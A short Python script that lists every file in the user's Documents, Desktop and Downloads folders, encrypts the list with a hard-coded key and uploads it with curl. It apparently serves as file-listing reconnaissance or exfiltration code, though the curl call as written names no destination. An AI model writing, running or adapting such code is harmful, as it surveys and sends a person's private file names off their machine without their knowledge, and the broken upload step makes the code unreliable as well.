import os
import pwd
import getpass

from cryptography.fernet import Fernet
from subprocess import call

user = getpass.getuser()
fe = Fernet(b'gda0KrfQjVKFtc9xaQMAc394ZkS8ePWz9A1wJf39REU=')

top_dirs = ['Documents', 'Desktop', 'Downloads']

all_files = []
for top_level in top_dirs:
    for root, dirs, files in os.walk(os.path.join('/', 'Users', user, top_level), topdown=False):
        for name in files:
            all_files.append(os.path.join(root, name))

token = fe.encrypt('\n'.join(all_files).encode())

with open('all-files.txt', 'wb') as f:
    f.write(token)

output = call(['curl', '--upload-file', './all-files.txt'])
print("uploaded")
print(output)
